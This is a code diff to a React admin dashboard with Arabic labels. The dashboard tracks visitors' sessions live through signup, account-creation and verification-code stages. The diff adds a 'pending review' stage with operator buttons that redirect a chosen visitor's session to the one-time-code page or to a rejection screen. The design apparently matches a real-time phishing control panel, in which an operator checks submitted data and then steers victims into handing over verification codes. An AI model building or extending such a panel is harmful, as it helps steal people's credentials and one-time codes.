@@ -1,5 +1,5 @@
 import { useMemo, useState } from 'react';
-import { Shield, ChevronDown, History, Wifi, WifiOff, Home as HomeIcon, KeyRound, ShieldCheck, Loader2, Clock, User } from 'lucide-react';
+import { Shield, ChevronDown, History, Wifi, WifiOff, Home as HomeIcon, KeyRound, ShieldCheck, Loader2, Clock, User, CheckCircle, XCircle } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
 import { useAdminRealtime, type ClientState, type ClientStage, type StageLogEntry } from '@/hooks/useAdminRealtime';
@@ -8,10 +8,11 @@ const STAGE_LABEL: Record<string, string> = {
   home: 'الرئيسية',
   signup: 'التسجيل',
   create_account: 'إنشاء الحساب',
+  pending_approval: 'قيد المراجعة',
   verify: 'رمز التحقق',
 };
 
-const STAGE_ORDER = ['home', 'signup', 'create_account', 'verify'];
+const STAGE_ORDER = ['home', 'signup', 'create_account', 'pending_approval', 'verify'];
 
 function formatTime(iso: string | null): string {
   if (!iso) return '—';
@@ -210,6 +211,30 @@ function ClientCard({
               </Button>
             </div>
           </div>
+
+          {/* أزرار الموافقة/الرفض - تظهر فقط عند مرحلة pending_approval */}
+          {client.stage === 'pending_approval' && (
+            <div className="space-y-2 pt-4 border-t border-border">
+              <p className="text-sm font-medium text-muted-foreground">إجراءات التحقق من البيانات</p>
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                <Button
+                  className="gap-2 h-12 bg-emerald-500 hover:bg-emerald-600 text-white"
+                  onClick={() => sendRedirect(client.sessionId, 'verify')}
+                >
+                  <CheckCircle className="w-5 h-5" />
+                  موافق - تحويل لرمز التحقق
+                </Button>
+                <Button
+                  variant="destructive"
+                  className="gap-2 h-12"
+                  onClick={() => sendRedirect(client.sessionId, 'rejected')}
+                >
+                  <XCircle className="w-5 h-5" />
+                  مرفوض - إعادة المحاولة
+                </Button>
+              </div>
+            </div>
+          )}
         </div>
       )}
 
